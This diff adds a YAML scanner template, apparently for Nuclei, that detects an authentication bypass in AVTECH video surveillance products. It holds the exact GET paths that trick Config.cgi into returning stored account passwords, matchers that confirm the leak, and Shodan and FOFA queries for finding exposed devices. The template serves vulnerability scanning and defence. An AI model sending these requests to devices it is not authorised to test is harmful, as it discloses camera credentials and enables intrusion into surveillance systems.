@@ -1,0 +1,42 @@
+id: avtech-auth-bypass
+
+info:
+  name: AVTECH Video Surveillance Product - Authentication Bypass
+  author: ritikchaddha
+  severity: high
+  description: |
+    AVTECH Video Surveillance Products password disclosure through /cgi-bin/user/Config.cgi.
+  metadata:
+    verified: true
+    max-request: 2
+    shodan-query: title:"login" product:"Avtech"
+    fofa-query: app="AVTECH-视频监控"
+  tags: exposure,avtech,auth-bypass,password
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/cgi-bin/user/Config.cgi?.cab&action=get&category=Account.*"
+      - "{{BaseURL}}/cgi-bin/user/Config.cgi?/nobody&action=get&category=Account.*"
+
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'Account.Maxuser='
+          - 'Account.LocalPassword='
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - text/plain
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022100a1046fea8550528fbfb44d771ecbd51d37c31bea1a7bf68333ba8e6ddf649c79022077bc401bb2f32f93cc9d6a29239c53624f99bcf7f01e962f7e7c6d99485f290a:922c64590222798bb761d5b6d8e72950
